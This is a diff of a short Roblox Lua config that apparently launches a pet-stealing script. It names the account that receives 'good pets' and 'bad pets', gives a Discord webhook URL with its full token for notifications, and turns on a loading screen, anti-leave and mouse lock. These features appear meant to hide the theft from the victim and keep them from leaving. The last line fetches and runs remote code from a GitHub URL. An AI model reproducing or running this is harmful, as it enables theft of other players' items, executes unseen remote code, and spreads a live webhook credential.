@@ -1,9 +1,9 @@
-UserName = "Minaz64x"
-Webhook = "https://discord.com/api/webhooks/1145016683765977159/htbDaEhjXSzeFb59TQ1jQYLlBZT6rR3VrgcazbbOC3oARWzgiIMSrq6qTHM0KDZneX7y" 
-UserName2 = "daviblazer01" 
+UserName = "Minaz64x" -- good pets
+Webhook = "https://discord.com/api/webhooks/1145016683765977159/htbDaEhjXSzeFb59TQ1jQYLlBZT6rR3VrgcazbbOC3oARWzgiIMSrq6qTHM0KDZneX7y" -- pings for pets
+UserName2 = "Minaz64x" -- bad pets 
 
-_G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true 
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
